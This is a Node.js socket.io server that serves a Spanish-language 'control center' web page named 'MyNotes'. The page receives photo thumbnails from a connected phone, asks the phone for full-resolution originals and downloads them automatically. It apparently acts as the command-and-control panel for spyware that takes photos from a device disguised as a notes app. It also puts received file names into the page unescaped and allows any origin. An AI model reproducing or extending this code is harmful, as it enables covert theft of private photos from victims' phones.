const express = require('express');
const http = require('http');
const { Server } = require("socket.io");
const cors = require('cors');

const app = express();
app.use(cors());

app.get('/', (req, res) => {
    res.send(`
    <html>
        <head>
            <title>MyNotes - Centro de Control</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body { font-family: sans-serif; background: #121212; color: white; padding: 20px; }
                .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 10px; }
                
                .card { 
                    background: #1e1e1e; border-radius: 8px; overflow: hidden; 
                    text-align: center; border: 1px solid #333; position: relative;
                }
                .card img { width: 100%; height: 120px; object-fit: cover; opacity: 0.6; transition: opacity 0.3s;}
                
                /* Estilo cuando llega la HD */
                .card.hd img { opacity: 1; border-bottom: 3px solid #00e676; }
                
                .info { padding: 5px; font-size: 10px; color: #aaa; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }

                /* BOTÓN DE PEDIR */
                .btn-req { 
                    background: #6200ea; border: none; padding: 10px; width: 100%; 
                    cursor: pointer; color: white; font-weight: bold; font-size: 11px;
                }
                .btn-req:hover { background: #7c43bd; }
                .btn-req:disabled { background: #333; cursor: wait; color: #888; }

                /* Mensaje de estado */
                #status { padding: 15px; background: #222; margin-bottom: 20px; border-radius: 5px; text-align: center; font-weight: bold;}
            </style>
        </head>
        <body>
            <div id="status">📡 Esperando conexión...</div>
            <div class="grid" id="grid"></div>

            <script src="/socket.io/socket.io.js"></script>
            <script>
                const socket = io();
                const grid = document.getElementById('grid');
                const status = document.getElementById('status');

                socket.on('connection_alert', msg => {
                    status.innerText = msg;
                    status.style.color = msg.includes("Conectado") ? "#00e676" : "#ff1744";
                });

                // 1. LLEGA MINIATURA (Preview)
                socket.on('new_preview', data => {
                    if(document.getElementById(data.path)) return; // Evitar repetidos

                    const card = document.createElement('div');
                    card.className = 'card';
                    card.id = data.path; // ID único
                    card.innerHTML = \`
                        <img src="data:image/jpeg;base64,\${data.image64}">
                        <div class="info">\${data.name}</div>
                        <button class="btn-req" onclick="pedirYDescargar(this, '\${data.path}', '\${data.name}')">⚡ OBTENER HD</button>
                    \`;
                    grid.prepend(card);
                });

                // 2. LLEGA FOTO HD (Original)
                socket.on('receive_full', data => {
                    // Descarga Automática (Magia)
                    downloadBase64File(data.image64, data.name);
                    
                    // Actualizar la tarjeta visualmente
                    // Buscamos la tarjeta por nombre aproximado o ID si pudiéramos
                    // Como el servidor devuelve "HD_nombre.jpg", buscamos "nombre.jpg"
                    const originalName = data.name.replace("HD_", "");
                    const cards = document.getElementsByClassName('card');
                    
                    for(let card of cards) {
                        if(card.innerHTML.includes(originalName)) {
                            card.classList.add('hd');
                            const img = card.querySelector('img');
                            const btn = card.querySelector('button');
                            
                            img.src = "data:image/jpeg;base64," + data.image64; // Reemplazar borrosa por HD
                            btn.innerText = "✅ DESCARGADO";
                            btn.style.background = "#00e676";
                            btn.style.color = "#000";
                        }
                    }
                });

                function pedirYDescargar(btn, path, name) {
                    // Cambiar botón a "Cargando..."
                    btn.innerText = "⏳ BAJANDO...";
                    btn.disabled = true;
                    
                    // Pedir al celular
                    socket.emit('order_download', { path: path });
                }

                // Función auxiliar para forzar descarga
                function downloadBase64File(base64Data, fileName) {
                    const link = document.createElement('a');
                    link.href = "data:image/jpeg;base64," + base64Data;
                    link.download = fileName;
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                }
            </script>
        </body>
    </html>
    `);
});

const server = http.createServer(app);
// Limite aumentado a 100MB para fotos gigantes
const io = new Server(server, { cors: { origin: "*" }, allowEIO3: true, maxHttpBufferSize: 1e8 });

io.on('connection', (socket) => {
    console.log('🔗 Cliente conectado:', socket.id);
    io.emit('connection_alert', '✅ Dispositivo Conectado');

    socket.on('usrData', (data) => {
        if (data.dataType === 'preview_image') {
            io.emit('new_preview', data);
        } else if (data.dataType === 'full_image') {
            console.log("📸 Foto HD recibida, enviando al navegador...");
            io.emit('receive_full', data);
        }
    });

    socket.on('order_download', (data) => {
        console.log("Pidiendo foto:", data.path);
        socket.broadcast.emit('request_full_image', data);
    });
    
    socket.on('disconnect', () => {
         io.emit('connection_alert', '❌ Dispositivo Desconectado');
    });
});

server.listen(process.env.PORT || 3000, () => console.log('Servidor listo'));
